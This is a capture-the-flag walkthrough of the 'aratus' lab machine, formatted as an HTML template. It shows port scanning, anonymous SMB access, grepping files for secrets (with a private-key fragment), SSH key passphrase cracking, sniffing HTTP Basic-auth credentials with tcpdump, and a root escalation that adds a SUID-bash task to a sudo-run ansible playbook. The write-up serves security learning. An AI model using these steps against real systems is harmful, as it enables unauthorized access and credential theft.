{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We perform a basic port scan.")}}

{{console("nmap -T5 -p- -sV 10.10.157.254", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 17:59 CET
Nmap scan report for 10.10.157.254
Host is up (0.077s latency).
Not shown: 65370 filtered tcp ports (no-response), 159 filtered tcp ports (host-unreach)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 217.44 seconds
")}}

{{text("We find a lot of open ports.")}}

{{list(['22 (SSH)', '22 (FTP)', '80 (HTTP)', '139 (netbios-ssn)', '443 (https)', '445 (microsoft-ds)'])}}

{{text("I started by trying to find anything on the FTP server, but that didn't work out.")}}

{{text("The web server also didn't have anything useful.")}}

{{text("What did have something useful is the SMB server running on port 139.")}}

{{header("SMB Server", "smb-server")}}

{{text("By login anonymously and not providing a password we were able to find a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>temporary share</code> that looked suspicious.")}}

{{console("smbclient -L //10.10.157.254/", "Password for [WORKGROUP/user]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	temporary share Disk      
	IPC$            IPC       IPC Service (Samba 4.10.16)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------")}}

{{text("We access this share.")}}

{{console("smbclient '//10.10.157.254/temporary share'", "Password for [WORKGROUP/user]:
Anonymous login successful
Try 'help' to get a list of possible commands.
smb: /> ls
  .                                   D        0  Mon Jan 10 14:06:44 2022
  ..                                  D        0  Tue Nov 23 17:24:05 2021
  .bash_logout                        H       18  Wed Apr  1 04:17:30 2020
  .bash_profile                       H      193  Wed Apr  1 04:17:30 2020
  .bashrc                             H      231  Wed Apr  1 04:17:30 2020
  .bash_history                       H        0  Mon Dec  9 17:37:32 2024
  chapter1                            D        0  Tue Nov 23 11:07:47 2021
  chapter2                            D        0  Tue Nov 23 11:08:11 2021
  chapter3                            D        0  Tue Nov 23 11:08:18 2021
  chapter4                            D        0  Tue Nov 23 11:08:25 2021
  chapter5                            D        0  Tue Nov 23 11:08:33 2021
  chapter6                            D        0  Tue Nov 23 11:12:24 2021
  chapter7                            D        0  Tue Nov 23 12:14:27 2021
  chapter8                            D        0  Tue Nov 23 11:12:45 2021
  chapter9                            D        0  Tue Nov 23 11:12:53 2021
  .ssh                               DH        0  Mon Jan 10 14:05:34 2022
  .viminfo                            H        0  Mon Dec  9 17:37:32 2024
  message-to-simeon.txt               N      251  Mon Jan 10 14:06:44 2022
")}}

{{text("Let's use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>mget *</code> to download all the files.")}}

{{text("Be sure to use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>RECURSE ON</code> and <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>PROMPT OFF</code> before getting the files.")}}

{{image("../../static/writeups/aratus/images/000001.jpg")}}

{{text("We should read the message to simeon.")}}

{{console("cat message-to-simeon.txt", "Simeon,

Stop messing with your home directory, you are moving files and directories insecurely!
Just make a folder in /opt for your book project...

Also you password is insecure, could you please change it? It is all over the place now!

- Theodore")}}

{{header("Shell as simeon", "shell-as-simeon")}}

{{text("We should check if in the directories we downloaded is a password to user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>simeon</code>.")}}

{{console("grep -riE 'password|key|secret|pass'", "chapter7/paragraph7.1/text2.txt:-----BEGIN RSA PRIVATE KEY-----
chapter7/paragraph7.1/text2.txt:s+1rJAjjcKxFS7lxPiCID6j/hZvsdjXnPScH2e/lQ1bMUk2rOCsDKCKeY0YGCkvI
chapter7/paragraph7.1/text2.txt:-----END RSA PRIVATE KEY-----
message-to-simeon.txt:Also you password is insecure, could you please change it? It is all over the place now!")}}

{{text("There is a text file that contains a file with a RSA private key.")}}

{{text("Let's use it to log in via SSH.")}}

{{image("../../static/writeups/aratus/images/000002.jpg")}}

{{text("It seems like we need a passphrase as well. The note mentioned that the password is insecure so we should be able to brute-force it pretty easily.")}}

{{image("../../static/writeups/aratus/images/000003.jpg")}}

{{text("Now we are able to log in as the user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>simeon</code>.")}}

{{header("Shell as theodore", "shell-as-theodore")}}

{{text("I ran <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>linpeas</code> on the target and noticed we are able to use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>tcpdump</code>.")}}

{{text("If we listen for packets send to the HTTP protocol (which are not encrypted), we might be able to catch users credentials.")}}

{{text("We use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>tcpdump</code> to catch packets on any network interface, we capture the whole packet and use verbose mode for more detailted output on port 80")}}

{{console("tcpdump -i any -s0 -vv port 80", "    localhost.54536 > localhost.http: Flags [P.], cksum 0xff07 (incorrect -> 0xa319), seq 1:224, ack 1, win 683, options [nop,nop,TS val 3768223 ecr 3768222], length 223: HTTP, length: 223
	GET /test-auth/index.html HTTP/1.1
	Host: 127.0.0.1
	User-Agent: python-requests/2.14.2
	Accept-Encoding: gzip, deflate
	Accept: */*
	Connection: keep-alive
	Authorization: Basic dGhlb2RvcmU6Uml[REDACTED]")}}

{{text("We capture base64 encoded credentials which after decoding give us user's <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>theodore</code> password.")}}

{{image("../../static/writeups/aratus/images/000004.jpg")}}

{{header("Shell as root", "shell-as-root")}}

{{text("Since we know our user's password, we can check his sudo privilages.")}}

{{console("sudo -l", "Matching Defaults entries for theodore on aratus:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep='COLORS DISPLAY HOSTNAME HISTSIZE
    KDEDIR LS_COLORS', env_keep+='MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE', env_keep+='LC_COLLATE LC_IDENTIFICATION
    LC_MEASUREMENT LC_MESSAGES', env_keep+='LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE', env_keep+='LC_TIME LC_ALL LANGUAGE
    LINGUAS _XKB_CHARSET XAUTHORITY', secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User theodore may run the following commands on aratus:
    (automation) NOPASSWD: /opt/scripts/infra_as_code.sh")}}

{{text("It looks like we can execute the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>infra_as_code.sh</code> file as the user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>automation</code>. Let's read this file.")}}

{{console("cat infra_as_code.sh", "#!/bin/bash
cd /opt/ansible
/usr/bin/ansible-playbook /opt/ansible/playbooks/*.yaml")}}

{{text("This script runs <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>ansible-playbook</code> on all the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>.yaml</code> files inside of <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/opt/ansible/playbooks</code>.")}}

{{text("When I tested the script, I noticed it also run 2 additional files.")}}

{{image("../../static/writeups/aratus/images/000005.jpg")}}

{{text("I added a command to one of these files that will add a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>SUID</code> to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/bin/bash</code>, allowing us to become root.")}}

{{console("cat configure-RedHat.yml", "---
- name: Configure Apache.
  lineinfile:
    dest: '{{ apache_server_root }}/conf/{{ apache_daemon }}.conf'
    regexp: '{{ item.regexp }}'
    line: '{{ item.line }}'
    state: present
    mode: 0644
  with_items: '{{ apache_ports_configuration_items }}'
  notify: restart apache

- name: Check whether certificates defined in vhosts exist.
  stat: path={{ item.certificate_file }}
  register: apache_ssl_certificates
  with_items: '{{ apache_vhosts_ssl }}'

- name: Add SUID bit to /bin/bash
  file:
    path: /bin/bash
    mode: u+s
  become: yes")}}

{{text("Now we run the script as the user automation and use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/bin/bash -p</code> after to become root.")}}

{{image("../../static/writeups/aratus/images/000006.jpg")}}

{{script()}}